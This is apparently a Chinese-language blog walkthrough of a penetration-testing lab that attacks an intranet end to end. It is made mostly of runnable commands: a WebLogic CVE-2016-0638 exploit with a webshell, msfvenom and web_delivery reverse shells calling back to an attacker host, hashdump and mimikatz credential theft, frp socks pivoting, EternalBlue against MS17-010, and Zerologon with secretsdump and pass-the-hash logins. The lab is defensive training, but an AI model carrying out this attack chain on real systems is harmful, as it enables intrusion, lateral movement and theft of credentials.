{"title":"内网靶场初探","uid":"9fd6beee5792c51d9bc8310e5aab4662","slug":"内网靶场初探","date":"2023-02-07T16:19:20.000Z","updated":"2024-02-14T07:49:48.000Z","comments":true,"path":"api/articles/内网靶场初探.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141544803.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>内容写的很乱，因为第一次搞，有点不太熟练，所以各位师傅简单看看就好，写的比较好的文章，可以参考这两个<br><a href=\"https://xz.aliyun.com/t/11588#toc-0\">https://xz.aliyun.com/t/11588#toc-0</a><br><a href=\"https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247488950&idx=1&sn=48d93f1fac38eae99cc4e78474eb557c&scene=21#wechat_redirect\">https://mp.weixin.qq.com</a></p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">https<span class=\"token punctuation\">:</span><span class=\"token comment\">//pan.baidu.com/s/1DOaDrsDsB2aW0sHSO_-fZQ</span>\n提取码<span class=\"token punctuation\">:</span> vbi2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>拓扑图如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537384.png\" alt=\"在这里插入图片描述\"><br>具体我这里使用的攻击机和外网ip</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">kali<span class=\"token punctuation\">:</span><span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.129</span>\nwin2012<span class=\"token punctuation\">:</span><span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>对于这些ip，我们只需要多设置几个网段就好，具体是在编辑中的虚拟网络编辑器</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537657.png\" alt=\"在这里插入图片描述\"><br>而后在各个机子的设置中使用这些网段就好<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537413.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"外网\"><a href=\"#外网\" class=\"headerlink\" title=\"外网\"></a>外网</h1><p>假设我们这里已知了外网的ip为<code>192.168.10.128</code>，接下来我们用namp进行扫描，简单查看一下开放端口</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nmap<span class=\"token operator\">.</span>exe <span class=\"token operator\">-</span>p1<span class=\"token operator\">-</span><span class=\"token number\">65535</span> <span class=\"token operator\">-</span>Pn <span class=\"token operator\">-</span><span class=\"token constant\">A</span> <span class=\"token operator\">-</span><span class=\"token constant\">T4</span> <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.128</span>\n<span class=\"token comment\">//这个命令行指令是使用nmap工具（nmap.exe）扫描IP地址为192.168.10.22的设备，扫描端口范围为</span>\n<span class=\"token number\">1</span><span class=\"token operator\">-</span><span class=\"token number\">65535</span>，使用<span class=\"token operator\">-</span>Pn选项表示不进行主机发现，使用<span class=\"token operator\">-</span><span class=\"token constant\">A</span>选项表示进行操作系统指纹识别，使用<span class=\"token operator\">-</span><span class=\"token constant\">T4</span>选项表示\n扫描速度为最快。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537014.png\" alt=\"在这里插入图片描述\"><br>这里扫描到7001端口开放，为WebLogic服务<br>这里使用脚本扫描一下，看是否存在漏洞，脚本链接如下<br><a href=\"https://github.com/rabbitmask/WeblogicScan\">https://github.com/rabbitmask/WeblogicScan</a><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537390.png\" alt=\"在这里插入图片描述\"><br>可以发现这里存在多个CVE漏洞，接下来我们使用注入工具尝试打一下，工具链接<br><a href=\"https://github.com/sp4zcmd/WeblogicExploit-GUI/releases/tag/WeblogicExploit-GUI\">https://github.com/sp4zcmd/WeblogicExploit-GUI/releases/tag/WeblogicExploit-GUI</a><br>使用第一个CVE漏洞进行尝试，即<code>CVE-2016-0638</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537355.png\" alt=\"在这里插入图片描述\"><br>成功执行命令，接下来尝试注入内存马<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537906.png\" alt=\"在这里插入图片描述\"><br>使用冰蝎进行连接<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537115.png\" alt=\"在这里插入图片描述\"><br>成功连接，拿到主机权限。<br>执行<code>net time /domain</code>查看是否在域内<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537110.png\" alt=\"在这里插入图片描述\">不在域内，这个大概率是<code>DMZ</code>的机器，这里简单提一下DMZ</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>英文全名“Demilitarized Zone”，中文含义是“隔离区”。在安全领域的具体含义是“内外网防火墙之间的区域”。</p></blockquote>\n<p>这里的话我们的权限是管理员权限，所以不用再进行权限提升，这里开始进行信息搜集，首先查看一下是否存在杀软，指令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">tasklist\n<span class=\"token comment\">//Tasklist命令是一个用来显示运行在本地或远程计算机上的所有进程的命令行工具</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537244.png\" alt=\"在这里插入图片描述\"><br>常见的杀软程序名字可以参考这里<br><a href=\"https://github.com/wwl012345/AVCheck/blob/main/%E6%9D%80%E8%BD%AF%E8%AF%86%E5%88%AB.txt\">https://github.com/wwl012345/AVCheck/blob/main/杀软识别.txt</a><br>这里的话可以看出不存在杀软，接下来进行msf上线，这里有两种方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、使用msfvenom生成木马文件\n<span class=\"token number\">2</span>、使用powercat进行反弹shell<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"法一\"><a href=\"#法一\" class=\"headerlink\" title=\"法一\"></a>法一</h2><p>首先我们在kali中生成木马</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msfvenom <span class=\"token operator\">-</span>p windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_tcp <span class=\"token constant\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.129</span> <span class=\"token constant\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">7777</span> <span class=\"token operator\">-</span>f exe <span class=\"token operator\">></span> shell3<span class=\"token operator\">.</span>exe <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/5f2fe3221b0049d5a3dd1f58fe8a219e.png\" alt=\"在这里插入图片描述\"></p>\n<p>接下来将<code>shell3.exe</code>移到靶机中<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537793.png\" alt=\"在这里插入图片描述\"><br>而后在kali中执行如下指令</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msfconsole  <span class=\"token comment\">//进入框架</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>multi<span class=\"token operator\">/</span>handler                      <span class=\"token comment\">//载入模块</span>\nset payload windows<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_tcp    <span class=\"token comment\">//加载攻击负载核</span>\nset lhost <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.129</span>                   <span class=\"token comment\">//设置本地监听地址，和生成的木马地址一致</span>\nset lport <span class=\"token number\">7777</span>                          <span class=\"token comment\">//设置本地监听端口，和生成的木马地址一致</span>\nrun                            <span class=\"token comment\">//开始执行，等待目标上线</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537841.png\" alt=\"在这里插入图片描述\"><br>接下来在靶机中执行木马文件<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537131.png\" alt=\"在这里插入图片描述\"><br>而后按理说在kali中查看即可上线，但我的是<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537296.png\" alt=\"在这里插入图片描述\"><br>回显<code> Meterpreter session 1 closed.  Reason: Died</code>，百度这个后得知可能的几个原因是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、msf版本不兼容\n<span class=\"token number\">2</span>、payload不匹配\n<span class=\"token number\">3</span>、存在杀软<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>生成木马和监听，payload都是<code>windows/meterpreter/reverse_tcp</code>，所以感觉应该不存在问题，杀软这个之前也已经检测过，不存在杀软，所以这里的话由于认知浅薄，技术过菜，这种方式没能继续下去，这里我换了一种方式来进行反弹shell</p>\n<h2 id=\"法二\"><a href=\"#法二\" class=\"headerlink\" title=\"法二\"></a>法二</h2><p>打开kali，指令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msfconsole  <span class=\"token comment\">//进入框架</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>multi<span class=\"token operator\">/</span>script<span class=\"token operator\">/</span>web_delivery <span class=\"token comment\">//载入模块</span>\nset srvhost <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.129</span>\nset srvport <span class=\"token number\">8080</span>\nset lhost <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.129</span>\nset lport <span class=\"token number\">7777</span>\n<span class=\"token comment\">//options</span>\n<span class=\"token comment\">//show targets</span>\nset target <span class=\"token number\">2</span>\nset payload windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_tcp <span class=\"token comment\">//set target 2是设置了powershell（psh）模块</span>\nexploit <span class=\"token operator\">-</span>j<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537490.png\" alt=\"在这里插入图片描述\"><br>接下来将<code>powershell.exe</code>这些代码进行复制，复制到冰蝎中执行<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537624.png\" alt=\"在这里插入图片描述\"><br>此时在kali攻击机中输入<code>jobs</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537664.png\" alt=\"在这里插入图片描述\"><br>可以发现此时就有会话了，我们进入会话</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">session <span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537866.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537323.png\" alt=\"在这里插入图片描述\"><br>成功上线</p>\n<p>上线后查看一下自动登录的密码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">run windows<span class=\"token operator\">/</span>gather<span class=\"token operator\">/</span>credentials<span class=\"token operator\">/</span>windows_autologin\nhashdump <span class=\"token comment\">//导出密码</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537155.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Administrator<span class=\"token punctuation\">:</span><span class=\"token number\">500</span><span class=\"token punctuation\">:</span>aad3b435b51404eeaad3b435b51404ee<span class=\"token punctuation\">:</span><span class=\"token class-name static-context\">ccef208c6485269c20db2cad21734fe7</span><span class=\"token operator\">::</span><span class=\"token punctuation\">:</span>\n<span class=\"token constant\">Guest</span><span class=\"token punctuation\">:</span><span class=\"token number\">501</span><span class=\"token punctuation\">:</span>aad3b435b51404eeaad3b435b51404ee<span class=\"token punctuation\">:</span><span class=\"token number\">31</span>d6cfe0d16ae931b73c59d7e0c089c0<span class=\"token operator\">::</span><span class=\"token punctuation\">:</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>md5解密<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537184.png\" alt=\"在这里插入图片描述\"><br>接下来查看网络信息</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">run get_local_subnets <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537224.png\" alt=\"在这里插入图片描述\"><br>发现有两个网段，上传fscan，用它扫一下内网网段</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">fscan64<span class=\"token operator\">.</span>exe <span class=\"token operator\">-</span>h <span class=\"token number\">10.10</span><span class=\"token number\">.20</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span> <span class=\"token operator\">></span> result<span class=\"token operator\">.</span>txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537377.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"win7\"><a href=\"#win7\" class=\"headerlink\" title=\"win7\"></a>win7</h1><p>发现新的机器<code>10.10.20.7</code>,同时扫出此机器疑似存在<code>MS17-010</code>漏洞<br>接下来添加新路由</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">meterpreter <span class=\"token operator\">></span> run autoroute <span class=\"token operator\">-</span>s <span class=\"token number\">10.10</span><span class=\"token number\">.20</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span> <span class=\"token comment\">//添加路由</span>\nmeterpreter <span class=\"token operator\">></span> run autoroute <span class=\"token operator\">-</span>p <span class=\"token comment\">//查看路由是否添加成功</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537648.png\" alt=\"在这里插入图片描述\"><br>接下来探测一下是否存在<code>ms17-010</code>漏洞<br>指令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">search ms17<span class=\"token operator\">-</span><span class=\"token number\">010</span>\n<span class=\"token keyword\">use</span> <span class=\"token number\">1</span>\nset <span class=\"token constant\">RHOSTS</span> <span class=\"token number\">10.10</span><span class=\"token number\">.20</span><span class=\"token number\">.7</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537706.png\" alt=\"在这里插入图片描述\"><br>然后这里会发现确实存在漏洞<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537679.png\" alt=\"在这里插入图片描述\"></p>\n<p>接下来就去利用这个漏洞获取权限</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token number\">2</span>\nset payload windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp\nset rhost <span class=\"token number\">10.10</span><span class=\"token number\">.20</span><span class=\"token number\">.7</span>\nset lport <span class=\"token number\">11111</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537787.png\" alt=\"在这里插入图片描述\"><br>执行<code>sessions -l</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537911.png\" alt=\"在这里插入图片描述\"><br>发现直接就是<code>system</code>权限，无需提权，接下来用<code>mimikatz</code>抓一下密码，指令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">load mimikatz\ncreds_all<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537158.png\" alt=\"在这里插入图片描述\"><br>换用其他方式抓取密码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">hashdump\nrun windows<span class=\"token operator\">/</span>gather<span class=\"token operator\">/</span>smart_hashdump\nrun windows<span class=\"token operator\">/</span>gather<span class=\"token operator\">/</span>credentials<span class=\"token operator\">/</span>windows_autologin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537132.png\" alt=\"在这里插入图片描述\"><br>发现另一组用户<code>john:admin!@#45</code><br>接下来去打mssql，用SharpSQLTools.exe<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537212.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537319.png\" alt=\"在这里插入图片描述\"><br>而后cs利用中转生成木马，通过GUI工具上传到可写目录，接下来去执行即可上线cs</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537399.png\" alt=\"在这里插入图片描述\"><br>而后再利用sharpSQLTools进行权限提升，即可拿下mssql这个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">SharpSQLTools<span class=\"token operator\">.</span>exe <span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.18</span> sa sa master install_clr\nSharpSQLTools<span class=\"token operator\">.</span>exe <span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.18</span> sa sa master enable_clr\nSharpSQLTools<span class=\"token operator\">.</span>exe <span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.18</span> sa sa master clr_efspotato whoami<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537580.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537632.png\" alt=\"在这里插入图片描述\"><br>最后一个域控的话，这里可以参考这篇文章<br><a href=\"https://www.freebuf.com/articles/system/288515.html\">https://www.freebuf.com/articles/system/288515.html</a><br>我们这里首先验证漏洞是否存在，具体脚本看<a href=\"https://github.com/SecuraBV/CVE-2020-1472\">https://github.com/SecuraBV/CVE-2020-1472</a><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537738.png\" alt=\"在这里插入图片描述\"><br>回显<code>Success</code>，说明存在漏洞，接下来去重置域账号<br>脚本参考<a href=\"https://github.com/dirkjanm/CVE-2020-1472\">https://github.com/dirkjanm/CVE-2020-1472</a></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>但要先安装要安装impacket(<a href=\"https://github.com/SecureAuthCorp/impacket\">https://github.com/SecureAuthCorp/impacket</a>)<br>安装方法：python -m pip install </p></blockquote>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537787.png\" alt=\"在这里插入图片描述\"><br>而后读取域控中的hash</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">python secretsdump<span class=\"token operator\">.</span>py redteam<span class=\"token operator\">.</span>red<span class=\"token operator\">/</span><span class=\"token class-name type-declaration\">OWA</span>$@<span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.8</span> <span class=\"token operator\">-</span>just<span class=\"token operator\">-</span>dc <span class=\"token operator\">-</span>no<span class=\"token operator\">-</span>pass<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537891.png\" alt=\"在这里插入图片描述\"><br>接下来有了hash，我们用<code>wmiexec.py</code>进行登录</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">python wmiexec<span class=\"token operator\">.</span>py <span class=\"token operator\">-</span>hashes aad3b435b51404eeaad3b435b51404ee<span class=\"token punctuation\">:</span><span class=\"token number\">028</span>b70314013e1372797cff51298880e redteam<span class=\"token operator\">.</span>red<span class=\"token operator\">/</span>administrator@<span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.8</span> <span class=\"token operator\">-</span>codec gbk<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537949.png\" alt=\"在这里插入图片描述\"><br>成功拿到权限</p>\n<h1 id=\"后言\"><a href=\"#后言\" class=\"headerlink\" title=\"后言\"></a>后言</h1><p>这个靶场Mssql那个机子有问题，怎么打都打不进去，msf执行语句无法上线<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537995.png\" alt=\"在这里插入图片描述\"><br>使用<code>proxifier</code>+<code>SharpSQLToolsGUI</code>上传cs的木马文件后也无法上线<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537357.png\" alt=\"在这里插入图片描述\"><br>所以最终cs也是没能成功上线，只上线了两台机子<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537487.png\" alt=\"在这里插入图片描述\"><br>不过也学到了很多东西，比如ew代理，frp内网穿透，这里再说一下我cs上线的时候，是如何通过win2012打win7的，拿下win2012后，我们在攻击机中设置frps，frps.ini内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span>common<span class=\"token punctuation\">]</span>\nbind_addr <span class=\"token operator\">=</span><span class=\"token number\">0.0</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span>\nbind_port <span class=\"token operator\">=</span> <span class=\"token number\">7000</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537421.png\" alt=\"在这里插入图片描述\"><br>然后我们在受害机，也就是win2012中配置frpc，<code>frpc.ini</code>内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span>common<span class=\"token punctuation\">]</span>\nserver_addr <span class=\"token operator\">=</span> <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.129</span>\nserver_port <span class=\"token operator\">=</span> <span class=\"token number\">7000</span>\n<span class=\"token punctuation\">[</span>plugin_socks<span class=\"token punctuation\">]</span>\ntype <span class=\"token operator\">=</span> tcp\nremote_port <span class=\"token operator\">=</span> <span class=\"token number\">7777</span>\nplugin <span class=\"token operator\">=</span> socks5\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>然后执行frpc<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141537438.png\" alt=\"在这里插入图片描述\"><br>回显success，此时代理就完成了，攻击机就相当于win2012了，接下来在攻击机用msf打就好了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\nmsf6 <span class=\"token operator\">></span> setg Proxies socks5<span class=\"token punctuation\">:</span><span class=\"token number\">192.168</span><span class=\"token number\">.0</span><span class=\"token number\">.175</span><span class=\"token punctuation\">:</span><span class=\"token number\">7777</span>\nmsf6 <span class=\"token operator\">></span> setg ReverseAllowProxy <span class=\"token constant boolean\">true</span>\nmsf6 <span class=\"token operator\">></span> <span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_eternalblue\nmsf6 <span class=\"token operator\">></span> set payload windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp\nmsf6 <span class=\"token operator\">></span> set rhost <span class=\"token number\">10.10</span><span class=\"token number\">.20</span><span class=\"token number\">.7</span>\nmsf6 <span class=\"token operator\">></span> run<span aria-hidden=\"true\" 